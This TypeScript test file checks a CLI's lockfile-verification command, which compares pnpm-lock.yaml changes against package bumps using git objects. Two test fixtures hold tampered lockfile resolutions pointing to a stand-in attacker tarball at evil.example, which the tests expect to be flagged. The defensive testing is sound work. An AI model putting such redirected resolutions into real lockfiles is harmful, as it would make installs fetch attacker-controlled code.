/**
 * `evidence dependencies` reads the touched lockfiles from git objects at base and head and has
 * the producer check them (security audit M7): a patch bump whose pnpm-lock.yaml change matches
 * is verified; the same bump with a rewritten resolution is not.
 */
import { writeFileSync } from "node:fs";
import { join } from "node:path";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { cli, document, ensureBundle, type TempRepo, tempRepo } from "./helpers.js";

const repos: TempRepo[] = [];
function repo(...args: Parameters<typeof tempRepo>): TempRepo {
  const r = tempRepo(...args);
  repos.push(r);
  return r;
}

beforeAll(() => ensureBundle(), 120_000);
afterAll(() => {
  for (const r of repos) r.cleanup();
});

const pkg = (spec: string) =>
  `${JSON.stringify({ name: "demo", version: "1.0.0", dependencies: { "left-pad": spec } }, null, 2)}\n`;

/** A pnpm v9 lockfile with left-pad at `v`. */
function pnpm(v: string, resolution = `{integrity: sha512-${v === "1.3.0" ? "AAAA" : "BBBB"}==}`) {
  return [
    "lockfileVersion: '9.0'",
    "",
    "settings:",
    "  autoInstallPeers: true",
    "  excludeLinksFromLockfile: false",
    "",
    "importers:",
    "",
    "  .:",
    "    dependencies:",
    "      left-pad:",
    `        specifier: ^${v}`,
    `        version: ${v}`,
    "",
    "packages:",
    "",
    `  left-pad@${v}:`,
    `    resolution: ${resolution}`,
    "",
    "snapshots:",
    "",
    `  left-pad@${v}: {}`,
    "",
  ].join("\n");
}

async function lockfileOf(r: TempRepo) {
  const res = await cli(
    ["evidence", "dependencies", "--base", r.base, "--head", r.head, "--cwd", r.dir],
    r.dir,
  );
  expect(res.code, res.stderr).toBe(0);
  return document(res) as {
    changed: { name: string; bump: string }[];
    lockfileChanged: boolean;
    lockfile?: { verified: boolean; changes: unknown[]; problems: string[] };
  };
}

const BASE = { "package.json": pkg("^1.3.0"), "pnpm-lock.yaml": pnpm("1.3.0") };

describe("evidence dependencies: lockfile check", () => {
  it("a patch bump with the matching pnpm-lock.yaml change is verified", async () => {
    const r = repo(BASE, { "package.json": pkg("^1.3.1"), "pnpm-lock.yaml": pnpm("1.3.1") });
    // The working tree an install step left behind must not matter: only git objects are read.
    writeFileSync(
      join(r.dir, "pnpm-lock.yaml"),
      pnpm("1.3.1", "{tarball: https://evil.example/x.tgz}"),
    );
    const doc = await lockfileOf(r);
    expect(doc.changed).toMatchObject([{ name: "left-pad", bump: "patch" }]);
    expect(doc.lockfileChanged).toBe(true);
    expect(doc.lockfile).toEqual({
      verified: true,
      changes: [{ lockfile: "pnpm-lock.yaml", name: "left-pad", from: "1.3.0", to: "1.3.1" }],
      problems: [],
    });
  });

  it("the same bump with a tampered resolution is not verified", async () => {
    const evil = "{tarball: https://evil.example/left-pad-1.3.1.tgz}";
    const r = repo(BASE, { "package.json": pkg("^1.3.1"), "pnpm-lock.yaml": pnpm("1.3.1", evil) });
    const doc = await lockfileOf(r);
    expect(doc.lockfile?.verified).toBe(false);
    expect(doc.lockfile?.problems.join("\n")).toContain("does not resolve from the registry");
  });

  it("a lockfile added by the change (absent at base) is not verified", async () => {
    const r = repo(
      { "package.json": pkg("^1.3.0") },
      { "package.json": pkg("^1.3.1"), "pnpm-lock.yaml": pnpm("1.3.1") },
    );
    const doc = await lockfileOf(r);
    expect(doc.lockfile?.verified).toBe(false);
    expect(doc.lockfile?.problems.join("\n")).toContain("pnpm-lock.yaml: the lockfile was added");
  });

  it("a nested lockfile is read by its repo path", async () => {
    const r = repo(
      { "app/package.json": pkg("^1.3.0"), "app/pnpm-lock.yaml": pnpm("1.3.0") },
      { "app/package.json": pkg("^1.3.1"), "app/pnpm-lock.yaml": pnpm("1.3.1") },
    );
    const doc = await lockfileOf(r);
    expect(doc.lockfile).toMatchObject({ verified: true, problems: [] });
  });
});
